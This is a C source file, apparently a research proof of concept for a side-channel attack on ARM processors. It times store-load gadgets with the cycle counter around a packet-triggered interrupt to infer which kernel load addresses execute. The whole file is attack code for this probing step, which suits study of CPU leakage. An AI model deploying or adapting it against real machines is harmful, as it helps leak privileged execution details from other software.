/*
 * Copyright (c) 2025 Hongpei Zheng
 * SPDX-License-Identifier: Apache-2.0
 */
#include <stdio.h>
#include <stdint.h>
#include <sched.h>
#include <pthread.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/icmp.h>
#include <string.h>
#include <unistd.h>

#include "driver.h"
#include "inst.h"

#define MDP_THRESHOLD 200
#define SIZE_EVICT_SET 32
#define SIZE_PRIMITIVE 32
#define TRY_TIMES 1000
FILE* file;
FILE* syscallfile;

void send_raw_packet() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(12345);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    char msg[] = "hello";
    sendto(sock, msg, strlen(msg), 0, (struct sockaddr*)&addr, sizeof(addr));
    close(sock);
    return;
}

FILE* open_file(char* filename) {
    char path[256];
    snprintf(path, sizeof(path), "data/%s", filename);
    FILE* filetmp = fopen(path, "a+");
    if (filetmp == NULL) {
        perror("Failed to open file");
        exit(EXIT_FAILURE);
    }
    return filetmp;
}

void closefile(FILE* file) {
    fclose(file);
}

void get_top_2(int val_cnt[16], int value[2], int score[2]) {
    int i, j, k;
    j = k = -1;
    for (i = 0; i < 16; i++) {
        if (j < 0 || val_cnt[i] >= val_cnt[j]) {
            k = j;
            j = i;
        } else if (k < 0 || val_cnt[i] >= val_cnt[k]) {
            k = i;
        }
    }
    // printf("[%d] %d [%d] %d\n", j, val_cnt[j], k, val_cnt[k]);
    value[0] = j;
    value[1] = k;
    score[0] = val_cnt[j];
    score[1] = val_cnt[k];
}

static inline __attribute__((always_inline)) void fence(void) {
    asm volatile ("dsb ish" ::: "memory");
    asm volatile ("isb" ::: "memory");
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t time;
    asm volatile(
        "dsb sy \n\t"
        "isb \n\t"
        "mrs %0, PMCCNTR_EL0 \n\t"
        "isb \n\t"
        :"=r"(time)
    );
    return time;
}

void train(uint64_t* entries, int entry_len) {
    int A[10];
    int sample[entry_len][2][16];
    uint64_t t;
    void* tmp;
    for(int i = 0; i < 16; ++ i) {
        for(int j = 0; j < entry_len; ++ j)
            sample[j][0][i] = sample[j][1][i] = 0;
    }

    void(*stld[entry_len])(void*, void*);
    for(int i = 0; i < entry_len; ++ i) {
        stld[i] = (void*)entries[i];
    }

    for (int cmd = 0; cmd < 2; ++ cmd) {
        for (int try = TRY_TIMES; try > 0; -- try) {
            for (int i = 0; i < entry_len; ++ i) {
                for(int j = 0; j < 3; ++ j) {
                    stld[i](&A[0], &A[0]);
                }
            }

            // TODO: You can modify the specific interrupt or function here. Default is sending raw packets.

            // context_switch(cmd);
            send_raw_packet();
            // usleep(10);
            // sched_yield();
            // gettimeofday(&tv, NULL);
            // tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, \
        MAP_PRIVATE, -1, 0);
            // printf(" ");
            // syscallfile = fopen("data/tmp.txt", "a+");

            // END TODO

            for (int i = 0; i < entry_len; ++ i) {
                int val = 0;
                for(int j = 0; j < 15; ++ j) {
                    t = rdtsc();
                    stld[i](&A[0], &A[4]);
                    if(rdtsc() - t > MDP_THRESHOLD) {
                        val += 1;
                    }
                }
                if (val >= 0 && val < 16) {
                    sample[i][cmd][val] ++;
                }
            }
        }
    }

    int value[2][2], score[2][2];
    for(int i = 0; i < entry_len; ++ i) {
        get_top_2(sample[i][0], value[0], score[0]);  // positive results
        get_top_2(sample[i][1], value[1], score[1]);  // negative results
        if (value[0][0] != value[1][0]) {
            fprintf(file, "%lx: P [%d](%d)/[%d](%d), N [%d](%d)/[%d](%d)\n",
                 entries[i] + LD_OFFSET, value[0][0], score[0][0],
                value[0][1], score[0][1], value[1][0],
                score[1][0], value[1][1], score[1][1]);
        }
        else if (score[0][0] - score[0][1] > 900 && score[1][0] - score[1][1] <= 600) {
            fprintf(file, "%lx: P [%d](%d)/[%d](%d), N [%d](%d)/[%d](%d)\n",
                entries[i] + LD_OFFSET, value[0][0], score[0][0],
                value[0][1], score[0][1], value[1][0],
                score[1][0], value[1][1], score[1][1]);
        }
    }
    // munmap(tmp, 4096);
}

void attacker() {
    bind_cpu(CPU);
    init_device();
    init_func_base();
    int func_num = 8;
    int offset[func_num];
    uint64_t entry[func_num];

    // traverse address in page to monitor each load offset, looking for traces of being executed during target interrupt
    for(int i = PG_SIZE - LD_OFFSET; i < PG_SIZE * 2 - LD_OFFSET; i += 4) {
        for(int j = 0; j < func_num; ++ j) {
            offset[j] = i + PG_SIZE * j;
            // printf("offset: %d\n", offset[j]);
        }
        update_func(offset, entry, func_num);
        train(entry, func_num);
    }
    fprintf(file, "\n");
    exit_func();
    exit_device();
    return;
}

int main(int argc, char* argv[]) {
    file = open_file(argv[1]);
    attacker();
    closefile(file);
    return 0;
}